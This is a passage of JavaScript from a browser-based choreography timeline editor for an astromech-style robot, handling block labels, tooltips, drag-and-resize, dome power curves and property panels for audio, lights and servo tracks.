      if (item.mode === 'text') return `TEXT ${(item.display||'fld_top').toUpperCase()} — ${item.text||'...'}`;
      if (item.mode === 'holo') return `HOLO ${(item.target||'fhp').toUpperCase()} — ${(item.effect||'on').toUpperCase()}`;
      if (item.mode === 'psi')  return `PSI ${(item.target||'both').toUpperCase()} — ${(item.sequence||'normal').toUpperCase()}`;
      return (_lightModes[item.mode] || item.mode || '?').toUpperCase();
    }
    if (track === 'arm_servos') {
      if (item.arm !== undefined) {
        const invalid = item.arm < 1 || item.arm > armsConfig._count;
        const armSid  = armsConfig._servos[item.arm - 1];
        const lbl     = (armSid && _servoSettings[armSid]?.label) || `ARM ${item.arm}`;
        return `${invalid ? '⚠ ' : ''}${lbl} ${item.action || ''}`.trim().toUpperCase();
      }
      // Legacy event with servo ID
      const sid = item.servo || '?';
      const lbl = _servoSettings[sid]?.label || item.servo_label || sid;
      return `⚠ ${lbl} ${item.action || ''}`.trim().toUpperCase();
    }
    if (track === 'dome_servos' || track === 'body_servos') {
      const sid = item.servo || '?';
      if (_SERVO_SPECIAL.has(sid)) {
        const names = { all: 'ALL', all_dome: 'ALL DOME', all_body: 'ALL BODY' };
        return `${names[sid] || sid} ${item.action || ''}`.trim().toUpperCase();
      }
      const configLabel  = _servoSettings[sid]?.label;
      const storedLabel  = item.servo_label;
      const hasMismatch  = !configLabel || (storedLabel && configLabel !== storedLabel);
      const label = hasMismatch ? (storedLabel || sid) : (configLabel || sid);
      return `${label} ${item.action || ''}`.trim().toUpperCase();
    }
    if (track === 'propulsion') return `L${item.left || 0} R${item.right || 0}`;
    return '?';
  }

  // Per-track accent colours for the inspector title
  const _TRACK_COLOR = {
    audio:       '#00eeff',
    lights:      '#ffcc00',
    dome:        '#cc44ff',
    dome_servos: '#00ff88',
    body_servos: '#198754',
    arm_servos:  '#2da05a',
    propulsion:  '#ff8800',
  };

  // Full label for block tooltip and inspector
  function _inspectorLabel(track, item) {
    if (track === 'audio') {
      if (!item.file) return '?';
      const f = item.file;
      if (f.toUpperCase().startsWith('RANDOM:')) return `RANDOM — ${f.slice(7).toUpperCase()}`;
      return f.replace(/\.[^.]+$/, '');
    }
    if (track === 'lights') {
      if (item.mode === 'text') return `TEXT ${(item.display||'fld_top').toUpperCase()} — ${item.text||'...'}`;
      if (item.mode === 'holo') return `HOLO ${(item.target||'fhp').toUpperCase()} — ${(item.effect||'on').toUpperCase()}`;
      if (item.mode === 'psi')  return `PSI ${(item.target||'both').toUpperCase()} — ${(item.sequence||'normal').toUpperCase()}`;
      return (_lightModes[item.mode] || item.mode || '?').toUpperCase();
    }
    if (track === 'dome')   return item.power !== undefined ? `${item.power}%` : 'KF';
    if (track === 'arm_servos') {
      if (item.arm !== undefined) {
        const invalid = item.arm < 1 || item.arm > armsConfig._count;
        const armSid  = armsConfig._servos[item.arm - 1];
        const lbl     = (armSid && _servoSettings[armSid]?.label) || `ARM ${item.arm}`;
        return `${invalid ? '⚠ ' : ''}${lbl} ${item.action || ''}`.trim().toUpperCase();
      }
      const sid = item.servo || '?';
      const lbl = _servoSettings[sid]?.label || item.servo_label || sid;
      return `⚠ ${lbl} ${item.action || ''}`.trim().toUpperCase();
    }
    if (track === 'dome_servos' || track === 'body_servos') {
      const sid = item.servo || '?';
      if (_SERVO_SPECIAL.has(sid)) {
        const names = { all: 'ALL', all_dome: 'ALL DOME', all_body: 'ALL BODY' };
        return `${names[sid] || sid} ${item.action || ''}`.trim().toUpperCase();
      }
      const configLabel = _servoSettings[sid]?.label;
      const storedLabel = item.servo_label;
      const hasMismatch = !configLabel || (storedLabel && configLabel !== storedLabel);
      const label = hasMismatch ? (storedLabel || sid) : (configLabel || sid);
      return `${label} ${item.action || ''}`.trim().toUpperCase();
    }
    if (track === 'propulsion') return `L${item.left ?? '?'} R${item.right ?? '?'}`;
    return '?';
  }

  // ── Floating tooltip ──────────────────────────────────────────────
  function _getTooltip() {
    let t = document.getElementById('chor-block-tooltip');
    if (!t) {
      t = document.createElement('div');
      t.id = 'chor-block-tooltip';
      t.style.cssText = [
        'position:fixed', 'z-index:9999', 'pointer-events:none',
        'font-family:Courier New,monospace', 'font-size:11px', 'letter-spacing:1.5px',
        'text-transform:uppercase', 'padding:4px 10px', 'border-radius:3px',
        'background:#060910', 'white-space:nowrap', 'display:none',
      ].join(';');
      document.body.appendChild(t);
    }
    return t;
  }

  function _showTooltip(e, track, item) {
    const t = _getTooltip();
    const label = _inspectorLabel(track, item);
    const c = _TRACK_COLOR[track] || '#00ccff';
    t.textContent = label;
    t.style.color = c;
    t.style.border = `1px solid ${c}`;
    t.style.boxShadow = `0 2px 10px ${c}33`;
    t.style.display = 'block';
    _positionTooltip(e);
  }

  function _positionTooltip(e) {
    const t = document.getElementById('chor-block-tooltip');
    if (!t || t.style.display === 'none') return;
    t.style.left = (e.clientX + 14) + 'px';
    t.style.top  = (e.clientY - 32) + 'px';
  }

  function _hideTooltip() {
    const t = document.getElementById('chor-block-tooltip');
    if (t) t.style.display = 'none';
  }

  // ── Inspector title — two-line layout ────────────────────────────
  function _setInspectorTitle(track, item) {
    const el = document.getElementById('chor-inspector-title');
    if (!el) return;
    const label = _inspectorLabel(track, item);
    const c = _TRACK_COLOR[track] || '#00ccff';
    el.innerHTML =
      `<div style="display:flex;align-items:center;justify-content:space-between">
         <span style="font-size:11px;letter-spacing:2px;color:rgba(var(--blue-rgb),.4);font-weight:normal">${escapeHtml(track.toUpperCase())} :</span>
         <button type="button" class="chor-inspector-delete-btn"
           style="background:none;border:none;color:var(--red);cursor:pointer;font-size:13px;padding:0;line-height:1"
           title="Delete block">✕</button>
       </div>
       <div style="font-size:10px;color:${c};text-shadow:0 0 8px ${c}55;letter-spacing:1.5px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-top:2px">${escapeHtml(label)}</div>`;
    // addEventListener instead of inline onclick — CSP-friendly + the
    // closure correctly references the CURRENT choreoEditor instance even
    // if the public API is ever re-exported. Also escapes track name in
    // case it's ever a user-controlled value (defense in depth).
    const delBtn = el.querySelector('.chor-inspector-delete-btn');
    if (delBtn) delBtn.addEventListener('click', () => choreoEditor._deleteSelected());
  }

  function _clearInspectorTitle() {
    const el = document.getElementById('chor-inspector-title');
    if (!el) return;
    el.textContent = 'NO BLOCK SELECTED';
    el.style.color = 'rgba(0,170,255,.25)';
    el.style.textShadow = 'none';
  }

  function _deleteBlock(track, idx) {
    if (!_chor || !_chor.tracks[track] || _chor.tracks[track][idx] == null) return;
    // Inform the user when a delete happens during playback — the Pi is
    // playing from the SAVED file on disk, not the in-memory _chor. So
    // the visual block disappears here but the event still fires on the
    // robot. Without this hint, users were confused why a block they
    // "just deleted" still produced sound / motion. _pollTimer is the
    // internal proxy for "playing" — same as the public isPlaying().
    if (_pollTimer !== null) {
      toast('Block removed from editor — current playback continues from the saved file. Stop and Play to apply.', 'warn');
    }
    _chor.tracks[track].splice(idx, 1);
    _setDirty(true); _selected = null;
    _clearInspectorTitle();
    const panel = document.getElementById('chor-props-content');
    if (panel) panel.innerHTML = '<span style="color:var(--text-dim);font-size:10px">Select a block to inspect.</span>';
    const ew = document.getElementById('chor-easing-wrap');
    if (ew) ew.style.display = 'none';
    _renderTrack(track);
    _refreshLayout();
    if (track === 'audio') _validateAudioOverflow();
  }

  // Soft-delete with 5s UNDO toast — used for drag-out-of-lane deletion
  // since that gesture is irreversible and easy to trigger by accident
  // (especially on tablets). Snapshots the item BEFORE splicing so the
  // restore is exact, including the original index position.
  function _softDeleteWithUndo(track, idx) {
    if (!_chor || !_chor.tracks[track] || _chor.tracks[track][idx] == null) return;
    const snapshot = _chor.tracks[track][idx];
    const label = _blockLabel(track, snapshot);
    _deleteBlock(track, idx);
    toast(`Deleted: ${label}`, 'warn', {
      label: 'UNDO',
      onClick: () => {
        if (!_chor) return;
        if (!_chor.tracks[track]) _chor.tracks[track] = [];
        _chor.tracks[track].push(snapshot);
        _chor.tracks[track].sort((a, b) => (a.t || 0) - (b.t || 0));
        _setDirty(true);
        _renderTrack(track);
        _refreshLayout();
        if (track === 'audio') _validateAudioOverflow();
        // Re-select the restored block so the user sees it pop back.
        const newIdx = _chor.tracks[track].indexOf(snapshot);
        if (newIdx >= 0 && track !== 'dome') _selectBlock(track, newIdx);
        toast('Restored', 'ok');
      },
    });
  }

  function _renderDomeLane(keyframes) {
    const lane = _lane('dome');
    if (!lane) return;
    lane.innerHTML = '';
    if (!keyframes || !keyframes.length) return;

    const W = _px(_chor.meta.duration + 3), H = 56;
    const NS  = 'http://www.w3.org/2000/svg';
    const svg = document.createElementNS(NS, 'svg');
    svg.setAttribute('width', W); svg.setAttribute('height', H);
    svg.style.cssText = 'position:absolute;top:4px;left:0;overflow:visible';

    // Y-axis: power=0 → center (y=H/2), +100 → near top, -100 → near bottom
    const yMid  = H / 2;
    const ySpan = H / 2 - 3;
    const powToY = p => yMid - (p / 100) * ySpan;
    const yToPow = y => Math.round(Math.max(-100, Math.min(100, -(y - yMid) / ySpan * 100)));

    // Build the PWM pulse path for one event:
    //   flat 0 → easing rise to POWER → hold → easing fall to 0
    // Easing ramps occupy min(8px, 40% of event width) each side.
    function pulsePath(kf) {
      const durSec = (kf.duration || 0) / 1000;
      const xA = _px(kf.t);
      const xB = _px(kf.t + durSec);
      const totalW = xB - xA;
      const yP = powToY(kf.power ?? 0);
      const ease = kf.easing || 'ease-in-out';

      if (totalW < 1) return `M ${xA} ${yMid} L ${xA} ${yP}`;   // degenerate: needle

      const accel = kf.accel ?? 1.0;   // legacy .chor files without accel → smooth bell curve
      const rampW = Math.max(6, totalW * (accel / 2));
      const xRise = xA + rampW;
      const xFall = xB - rampW;

      // When pulse is too narrow for a flat hold (rampW×2 ≥ totalW), merge into one S-arch
      if (xRise >= xFall) {
        const xMid2 = (xA + xB) / 2, hw = (xB - xA) / 2;
        if (ease === 'linear') return `M ${xA} ${yMid} L ${xMid2} ${yP} L ${xB} ${yMid} Z`;
        return `M ${xA} ${yMid}` +
          ` C ${xA+hw*0.42} ${yMid} ${xA+hw*0.58} ${yP} ${xMid2} ${yP}` +
          ` C ${xMid2+hw*0.42} ${yP} ${xMid2+hw*0.58} ${yMid} ${xB} ${yMid} Z`;
      }

      // Full pulse: rise ramp → hold plateau → fall ramp
      let riseC, fallC;
      if (ease === 'linear') {
        riseC = `L ${xRise} ${yP}`;
        fallC = `L ${xB} ${yMid}`;
      } else { // ease-in-out (and ease-in/ease-out share this default)
        riseC = `C ${xA+rampW*0.42} ${yMid} ${xA+rampW*0.58} ${yP} ${xRise} ${yP}`;
        fallC = `C ${xFall+rampW*0.42} ${yP} ${xFall+rampW*0.58} ${yMid} ${xB} ${yMid}`;
      }
      return `M ${xA} ${yMid} ${riseC} L ${xFall} ${yP} ${fallC} Z`;
    }

    keyframes.forEach((kf, i) => {
      const durSec = (kf.duration || 0) / 1000;
      const xA   = _px(kf.t);
      const xB   = _px(kf.t + durSec);
      const xMid = (xA + xB) / 2;
      const yP   = powToY(kf.power ?? 0);

      // Draw: filled area, glow halo, main stroke
      const d0 = pulsePath(kf);
      const fill = document.createElementNS(NS, 'path');
      fill.setAttribute('d', d0); fill.setAttribute('fill', 'rgba(204,68,255,0.10)');
      fill.setAttribute('stroke', 'none');
      svg.appendChild(fill);

      const glow = document.createElementNS(NS, 'path');
      glow.setAttribute('d', d0); glow.setAttribute('fill', 'none');
      glow.setAttribute('stroke', 'rgba(204,68,255,0.2)'); glow.setAttribute('stroke-width', '6');
      svg.appendChild(glow);

      const stroke = document.createElementNS(NS, 'path');
      stroke.setAttribute('d', d0); stroke.setAttribute('fill', 'none');
      stroke.setAttribute('stroke', '#cc44ff'); stroke.setAttribute('stroke-width', '2');
      svg.appendChild(stroke);

      // Power % label at the pulse peak
      const lbl = document.createElementNS(NS, 'text');
      lbl.setAttribute('x', xMid); lbl.setAttribute('y', yP - 7);
      lbl.setAttribute('text-anchor', 'middle');
      lbl.setAttribute('fill', '#cc44ff'); lbl.setAttribute('font-size', '8');
      lbl.setAttribute('font-family', 'Courier New');
      lbl.textContent = `${kf.power ?? 0}%`;
      svg.appendChild(lbl);

      // Draggable handle at the pulse peak
      const handle = document.createElementNS(NS, 'circle');
      handle.setAttribute('cx', xMid); handle.setAttribute('cy', yP);
      handle.setAttribute('r', '5');
      handle.setAttribute('fill', '#cc44ff');
      handle.setAttribute('stroke', '#060910'); handle.setAttribute('stroke-width', '2');
      handle.style.cursor = 'ns-resize';

      handle.addEventListener('mousedown', e => {
        e.stopPropagation(); e.preventDefault();
        const startMouseX = e.clientX, startMouseY = e.clientY;
        const startT      = kf.t;
        const startPower  = kf.power ?? 0;
        const startY      = powToY(startPower);
        const svgRect     = svg.getBoundingClientRect();
        const scaleY      = H / (svgRect.height || H);
        const scaleX      = W / (svgRect.width  || W);

        const onMove = e2 => {
          // Horizontal → time (snapped, clamped to ≥ 0, no overlap with neighbours)
          const rawT  = startT + _sec((e2.clientX - startMouseX) * scaleX);
          const newT  = _domeClampT(i, Math.max(0, _snap(rawT)));
          kf.t = newT; _setDirty(true);
          // Vertical → power
          const newPower = yToPow(startY + (e2.clientY - startMouseY) * scaleY);
          kf.power = newPower;
          // Recompute geometry
          const durSec = (kf.duration || 0) / 1000;
          const newXA  = _px(newT), newXB = _px(newT + durSec);
          const newXM  = (newXA + newXB) / 2;
          const newYP  = powToY(newPower);
          handle.setAttribute('cx', newXM); handle.setAttribute('cy', newYP);
          lbl.setAttribute('x', newXM); lbl.setAttribute('y', newYP - 7);
          lbl.textContent = `${newPower}%`;
          const d = pulsePath(kf);
          fill.setAttribute('d', d); glow.setAttribute('d', d); stroke.setAttribute('d', d);
          if (_selected && _selected.track === 'dome' && _selected.idx === i)
            _updatePropsPanel('dome', i);
        };
        const onUp = () => {
          document.removeEventListener('mousemove', onMove);
          document.removeEventListener('mouseup', onUp);
          keyframes.sort((a, b) => a.t - b.t);
          _renderDomeLane(keyframes);
          _refreshLayout();
        };
        document.addEventListener('mousemove', onMove);
        document.addEventListener('mouseup', onUp);
        _selectDomeKF(i);
      });

      handle.addEventListener('click', () => _selectDomeKF(i));
      svg.appendChild(handle);
    });

    lane.appendChild(svg);
  }

  function _renderMarkers() {
    document.querySelectorAll('.chor-lane').forEach(l => l.querySelectorAll('.chor-marker').forEach(m => m.remove()));
    const firstLane = _lane('audio');
    if (!firstLane || !_chor) return;
    (_chor.tracks.markers || []).forEach(m => {
      const div = document.createElement('div');
      div.className = 'chor-marker'; div.style.left = _px(m.t) + 'px';
      const lbl = document.createElement('div');
      lbl.className = 'chor-marker-label'; lbl.textContent = m.label;
      div.appendChild(lbl); firstLane.appendChild(div);
    });
  }

  // ── Drag + resize ─────────────────────────────────────────────────
  function _attachBlockEvents(block, track, idx) {
    // User-reported regression 2026-05-15: pointerdown +
    // setPointerCapture broke desktop drag — the captured pointer
    // intercepted mouseup so the document-level onUp never fired,
    // leaving the block in "still-clicking" state. Reverted to
    // mousedown. Multi-touch Pointer Events migration on the timeline
    // is a bigger refactor (needs _startDrag/_startResize to use
    // pointermove/pointerup pairs) — deferred until that's done in
    // one pass, not piecemeal.
    block.addEventListener('mousedown', e => {
      e.target.dataset.resize ? _startResize(e, block, track, idx) : _startDrag(e, block, track, idx);
      _selectBlock(track, idx);
      e.preventDefault();
    });
  }

  // Dome overlap guards — clamp t/duration so no two dome events overlap.
  // Called during drag, resize, and inspector edits.
  function _domeClampT(idx, newT) {
    const evs = _chor.tracks.dome || [];
    const durS = (evs[idx].duration || 200) / 1000.0;
    if (idx > 0) {
      const prev = evs[idx - 1];
      newT = Math.max(newT, prev.t + (prev.duration || 200) / 1000.0);
    }
    if (idx + 1 < evs.length) {
      newT = Math.min(newT, evs[idx + 1].t - durS);
    }
    return Math.max(0, newT);
  }

  function _domeClampDur(idx, newDur) {
    const evs = _chor.tracks.dome || [];
    if (idx + 1 < evs.length) {
      const maxDur = (evs[idx + 1].t - evs[idx].t) * 1000.0;
      newDur = Math.min(newDur, maxDur);
    }
    return Math.max(200, newDur);
  }

  function _startDrag(e, block, track, idx) {
    const startX = e.clientX, startLeft = parseFloat(block.style.left) || 0;
    const scroll = document.getElementById('chor-scroll');
    // Audit finding Perf M-3 2026-05-15: auto-scroll while dragging
    // near the right (or left) edge so the operator can drop an
    // event past the visible width without the block running out
    // of mouse-reach. Edge zone = 40px; scroll speed scales linearly
    // from 0 to 12px/tick within that zone.
    let _scrollTimer = null;
    const _stopAutoScroll = () => {
      if (_scrollTimer) { clearInterval(_scrollTimer); _scrollTimer = null; }
    };
    const onMove = e2 => {
      let newT = _snap(_sec(Math.max(0, startLeft + e2.clientX - startX)));
      if (track === 'dome') newT = _domeClampT(idx, newT);
      block.style.left = _px(newT) + 'px';
      _chor.tracks[track][idx].t = newT;
      _setDirty(true);
      _updatePropsPanel(track, idx);
      // Edge-driven auto-scroll
      if (scroll) {
        const r = scroll.getBoundingClientRect();
        block.style.opacity = (e2.clientY < r.top || e2.clientY > r.bottom) ? '0.3' : '1';
        const EDGE = 40;
        const rightOver = e2.clientX - (r.right - EDGE);
        const leftOver  = (r.left + EDGE) - e2.clientX;
        let dx = 0;
        if (rightOver > 0) dx =  Math.min(12, Math.max(2, rightOver / 4));
        else if (leftOver > 0) dx = -Math.min(12, Math.max(2, leftOver / 4));
        if (dx !== 0) {
          if (!_scrollTimer) {
            _scrollTimer = setInterval(() => {
              const before = scroll.scrollLeft;
              scroll.scrollLeft += dx;
              if (scroll.scrollLeft === before) return; // hit edge
              // Keep the dragged block moving with the scroll
              const adjT = _snap(_sec(Math.max(0, startLeft + e2.clientX - startX + (scroll.scrollLeft))));
              const clamped = track === 'dome' ? _domeClampT(idx, adjT) : adjT;
              block.style.left = _px(clamped) + 'px';
              _chor.tracks[track][idx].t = clamped;
            }, 16);
          }
        } else {
          _stopAutoScroll();
        }
      }
    };
    const onUp = e2 => {
      _stopAutoScroll();
      document.removeEventListener('mousemove', onMove);
      document.removeEventListener('mouseup', onUp);
      if (scroll) {
        const r = scroll.getBoundingClientRect();
        // Soft-delete with UNDO when dragged out of the timeline area.
        // Audit reclass C4 2026-05-15: 24px grace margin so an
        // operator overshooting by 1-5px while repositioning a
        // block doesn't trigger an accidental delete. UNDO toast
        // mitigates but operator still gets startled. Wider zone
        // = clearer "I meant to throw it away" intent.
        const GRACE = 24;
        if (e2.clientY < r.top - GRACE || e2.clientY > r.bottom + GRACE) {
          _softDeleteWithUndo(track, idx);
          return;
        }
      }
      block.style.opacity = '1';
      _renderTrack(track);
      _selectBlock(track, idx);
      _refreshLayout();
    };
    document.addEventListener('mousemove', onMove); document.addEventListener('mouseup', onUp);
  }

  function _startResize(e, block, track, idx) {
    const startX = e.clientX, startW = parseFloat(block.style.width) || 60;
    const item = _chor.tracks[track][idx];

    // User-reported 2026-05-15: arm_servos blocks could not be resized
    // by dragging the right edge anymore. Cause: this handler writes
    // item.duration unconditionally, but arm blocks compute their
    // rendered width from panel_duration + delay + arm_duration (see
    // _armBlockTotalDur). The `duration` write was a no-op for that
    // track, so the next _renderTrack snapped the block back to its
    // 3-field sum. Per-track resize logic below.
    const isArmBlock = (track === 'arm_servos');
    // Capture pre-drag arm field values so we can rescale them as the
    // user drags, instead of re-computing from the (already-modified)
    // dict on each move event (which would compound the scaling and
    // produce non-linear growth).
    const armStart = isArmBlock ? {
      panel: parseFloat(item.panel_duration) || 0,
      delay: parseFloat(item.delay)          || 0,
      arm:   parseFloat(item.arm_duration)   || 0,
    } : null;
    const armStartTotal = isArmBlock
      ? (armStart.panel + armStart.delay + armStart.arm)
      : 0;

    const onMove = e2 => {
      let newDur = _snap(_sec(Math.max(20, startW + e2.clientX - startX)));
      if (track === 'dome') newDur = _domeClampDur(idx, newDur);
      block.style.width = _px(newDur) + 'px';

      if (isArmBlock && armStartTotal > 0) {
        // Scale all three fields proportionally so the user sees the
        // total duration change while the relative weight of panel /
        // delay / arm stays the same. Round to 0.1s to match the
        // inspector's step granularity and avoid floating-point noise
        // like 1.0000000003.
        const scale = newDur / armStartTotal;
        item.panel_duration = +(armStart.panel * scale).toFixed(2);
        item.delay          = +(armStart.delay * scale).toFixed(2);
        item.arm_duration   = +(armStart.arm   * scale).toFixed(2);
      } else {
        item.duration = newDur;
      }
      _setDirty(true);
      _updatePropsPanel(track, idx);
    };
    const onUp = () => { document.removeEventListener('mousemove', onMove); document.removeEventListener('mouseup', onUp); _renderTrack(track); _selectBlock(track, idx); _refreshLayout(); };
    document.addEventListener('mousemove', onMove); document.addEventListener('mouseup', onUp);
  }

  // ── Properties panel ─────────────────────────────────────────────
  function _selectBlock(track, idx) {
    // Audit finding Perf M-7 2026-05-15: scope the deselection sweep
    // to the active track's lane instead of the whole document. For
    // a 1000-event chor the document walk was O(N) per click; the
    // lane walk is O(events-in-this-lane). Falls back to global if
    // we can't find the lane.
    const lane = document.querySelector(`.chor-lane[data-track="${track}"]`);
    const scope = lane || document;
    scope.querySelectorAll('.chor-block.selected').forEach(b => b.classList.remove('selected'));
    // If we narrowed to a lane, also clear any cross-lane selection
    // (a previous click could have selected a block in a different
    // lane — its .selected class persists if we only clear our lane).
    if (lane) {
      document.querySelectorAll('.chor-block.selected').forEach(b => b.classList.remove('selected'));
    }
    const block = document.querySelector(`.chor-block[data-track="${track}"][data-idx="${idx}"]`);
    if (block) block.classList.add('selected');
    _selected = { track, idx };
    _updatePropsPanel(track, idx);
  }

  // Audit finding Perf M-1 2026-05-15: click empty timeline area
  // clears the current selection so the inspector no longer shows
  // a stale event the user has visually moved past.
  function _deselectAll() {
    document.querySelectorAll('.chor-block.selected').forEach(b => b.classList.remove('selected'));
    _selected = null;
    _clearInspectorTitle();
    const panel = document.getElementById('chor-props-content');
    if (panel) panel.replaceChildren();
  }

  function _selectDomeKF(idx) {
    _selected = { track: 'dome', idx };
    _updatePropsPanel('dome', idx);
  }

  function _updatePropsPanel(track, idx) {
    const panel = document.getElementById('chor-props-content');
    if (!panel || !_chor) return;
    const item = (_chor.tracks[track] || [])[idx];
    if (!item) return;

    _setInspectorTitle(track, item);

    // ── Helpers ─────────────────────────────────────────────────────
    const set = (field, val) => choreoEditor._setProp(track, idx, field, val);

    function numRow(key, field, { min, max, step } = {}) {
      const val = item[field] !== undefined ? item[field] : '';
      const attrs = [
        min  !== undefined ? `min="${min}"`   : '',
        max  !== undefined ? `max="${max}"`   : '',
        step !== undefined ? `step="${step}"` : '',
      ].filter(Boolean).join(' ');
      const t_e = escapeHtml(track), f_e = escapeHtml(field);
      return `<div class="chor-prop-row">
        <span class="chor-prop-key">${key}</span>
        <input class="chor-prop-input" type="number" value="${val}" ${attrs}
          onchange="choreoEditor._setProp('${t_e}',${idx},'${f_e}',this.value)" style="width:68px">
      </div>`;
    }

    function selectRow(key, field, options, grouped = false) {
      const current = item[field] || '';
      let opts = '';
      if (grouped) {
        for (const [grp, names] of Object.entries(options)) {
          opts += `<optgroup label="${escapeHtml(grp.toUpperCase())}">`;
          for (const n of names)
            opts += `<option value="${escapeHtml(n)}"${String(n) === String(current) ? ' selected' : ''}>${escapeHtml(n)}</option>`;
          opts += '</optgroup>';
        }
      } else {
        opts += `<option value="">—</option>`;
        for (const [val, label] of Object.entries(options))
          // String(val)===String(current) — Object.entries always yields
          // string keys but `current` (item.ch, item.arm…) is a Number after
          // _setProp parses numeric fields. '0' === 0 is false → the option
          // matching item.ch=0 wasn't getting `selected`, so opening the
          // inspector on a CH 0 audio block showed CH 1 as the active choice.
          opts += `<option value="${escapeHtml(val)}"${String(val) === String(current) ? ' selected' : ''}>${escapeHtml(label)}</option>`;
      }
      // Audit finding Frontend M-2 2026-05-15: track + field are
      // code-controlled enums today (no user input flow), but
      // escapeHtml is the documented defense-in-depth for inline
      // onchange handlers. escapeHtml now escapes `'` (audit L-2),
      // so this wraps the latent risk.
      const t_e = escapeHtml(track), f_e = escapeHtml(field);
      return `<div class="chor-prop-row-full">
        <span class="chor-prop-key">${key}</span>
        <select class="chor-prop-select"
          onchange="choreoEditor._setProp('${t_e}',${idx},'${f_e}',this.value);choreoEditor._onFieldChange('${t_e}',${idx},'${f_e}',this.value)">
          ${opts}
        </select>
      </div>`;
    }

    function textRow(key, field, maxLen) {
      const val = item[field] !== undefined ? String(item[field]) : '';
      return `<div class="chor-prop-row-full">
        <span class="chor-prop-key">${key}</span>
        <input class="chor-prop-input" type="text" value="${escapeHtml(val)}" maxlength="${maxLen}" style="width:100%;box-sizing:border-box"
          oninput="choreoEditor._setProp('${track}',${idx},'${field}',this.value)">
      </div>`;
    }

    // ── Build field list by track ────────────────────────────────────
    let html = numRow('START', 't', { min: 0, step: 0.1 });

    if (track === 'audio') {
      if (item.duration !== undefined) html += numRow('DURATION', 'duration', { min: 0.1, step: 0.5 });

      // Audio issue banner
      const audioIssueKey = `audio:${idx}`;
      if (_audioIssues[audioIssueKey] === 'error') {
        html += `<div style="${_BNR_ERR}">
          ❌ <b>${escapeHtml(item.file || '')}</b> — file not found on slave.<br>Select a replacement below.
        </div>`;
      } else if (_audioIssues[audioIssueKey] === 'warn') {
        html += `<div style="${_BNR_WARN}">
          ⚠️ Unknown RANDOM category: <b>${escapeHtml(item.file?.slice(7) || '')}</b>
        </div>`;
      }

      // TYPE selector — specific file or random category
      const isRandom = (item.file || '').toUpperCase().startsWith('RANDOM:');
      html += `<div class="chor-prop-row-full">
        <span class="chor-prop-key">TYPE</span>
        <select class="chor-prop-select" onchange="choreoEditor._setAudioType('${track}',${idx},this.value)">
          <option value="specific"${!isRandom ? ' selected' : ''}>SPECIFIC FILE</option>
          <option value="random"${isRandom ? ' selected' : ''}>🎲 RANDOM CATEGORY</option>
        </select>
      </div>`;

      if (isRandom) {
        const curCat = (item.file || '').slice(7).split(':')[0];
        const cats = Object.fromEntries(Object.keys(_audioIndex).map(c => [c, c.toUpperCase()]));
        html += selectRow('CATEGORY', 'file',
          Object.fromEntries(Object.entries(cats).map(([c]) => [`RANDOM:${c}`, c.toUpperCase()])));
      } else if (_audioScanned.length) {
        html += selectRow('FILE', 'file', Object.fromEntries(_audioScanned.map(s => [s, s])));
      } else {
        html += selectRow('FILE', 'file', _audioIndex, true);
      }

      html += numRow('VOLUME', 'volume', { min: 0, max: 100 });
      html += selectRow('CHANNEL', 'ch', { 0: 'CH 0 — Primary (S:)', 1: 'CH 1 — Secondary (S2:)' });
      html += selectRow('PRIORITY', 'priority', {
        'high':   '🔒 HIGH — never evicted',
        'normal': 'NORMAL (default)',
        'low':    '▽ LOW — evicted first',
      });

    } else if (track === 'lights') {
      if (item.duration !== undefined) html += numRow('DURATION', 'duration', { min: 0.1, step: 0.5 });
      html += selectRow('MODE', 'mode', { ..._lightModes, text: '💬 Text', holo: '🔦 Holo', psi: '👁 PSI' });
      if (item.mode === 'psi') {
        html += selectRow('TARGET', 'target', { both:'FPSI + RPSI', fpsi:'FPSI (Front)', rpsi:'RPSI (Rear)' });
        html += selectRow('SEQUENCE', 'sequence', {
          normal:'NORMAL (default)', flash:'FLASH (random colors)',
          alarm:'ALARM (red)', failure:'FAILURE (cycle+fade)',
          redalert:'RED ALERT', leia:'LEIA (pale green)', march:'MARCH'
        });
      } else if (item.mode === 'holo') {
        html += selectRow('TARGET', 'target', {
          fhp:'FHP (Front)', rhp:'RHP (Rear)', thp:'THP (Top)', radar:'Radar Eye', all:'ALL'
        });
        html += selectRow('EFFECT', 'effect', {
          on:'ON (cycle)', off:'OFF', pulse:'PULSE', rainbow:'RAINBOW',
          random_move:'RANDOM MOVE', wag:'WAG', nod:'NOD'
        });
      } else if (item.mode === 'text') {
        const preview = (item.text || '...').slice(0, 20);
        html += `<div style="display:flex;align-items:center;gap:6px;padding:4px 8px 2px;color:#00ffea;font-size:10px;letter-spacing:.08em"><span style="font-size:13px">💬</span><span style="opacity:.7;font-style:italic;overflow:hidden;white-space:nowrap;text-overflow:ellipsis">${escapeHtml(preview)}</span></div>`;
        html += selectRow('DISPLAY', 'display', {
          fld_top:'FLD Top', fld_bottom:'FLD Bottom',
          fld_both:'FLD Top+Bottom', rld:'RLD', all:'ALL'
        });
        html += textRow('TEXT (MAX 20)', 'text', 20);
      }

    } else if (track === 'dome') {
      html += numRow('POWER %', 'power', { min: -100, max: 100, step: 1 });
      html += numRow('DURATION ms', 'duration', { min: 200, max: 10000, step: 100 });
      html += numRow('ACCEL FACTOR', 'accel', { min: 0.1, max: 1.0, step: 0.05 });
      html += selectRow('EASING', 'easing', {
        'linear':'LINEAR', 'ease-in':'EASE IN', 'ease-out':'EASE OUT', 'ease-in-out':'IN-OUT'
      });

    } else if (track === 'arm_servos') {
      const count = armsConfig._count;
      const isOpen = item.action !== 'close';

      // Migrate legacy `duration` → per-segment fields on first inspect so the
      // user always sees the granular controls and never sees both the old
      // and new fields side by side.
      if (item.panel_duration === undefined && item.delay === undefined && item.arm_duration === undefined) {
        const legacy = parseFloat(item.duration);
        const seed   = isNaN(legacy) ? 1.0 : Math.max(0.1, legacy);
        item.panel_duration = seed;
        item.arm_duration   = seed;
        item.delay          = 0.5;
        delete item.duration;
        _setDirty(true);
      }

      const seqHint = isOpen
        ? `Sequence: <b>panel opens</b> → wait <b>delay</b> → <b>arm extends</b>`
        : `Sequence: <b>arm retracts</b> → wait <b>delay</b> → <b>panel closes</b>`;
      html += `<div style="${_BNR_OK}">
        ${seqHint}<br>
        Total: <b>${_armBlockTotalDur(item).toFixed(2)} s</b>
      </div>`;

      if (item.arm !== undefined) {
        // New format — arm slot picker
        if (count === 0) {
          html += `<div style="${_BNR_WARN}">
            ⚠️ No arms configured — go to <b>Settings → Arms</b> to assign arm servos.
          </div>`;
        } else if (item.arm < 1 || item.arm > count) {
          html += `<div style="${_BNR_ERR}">
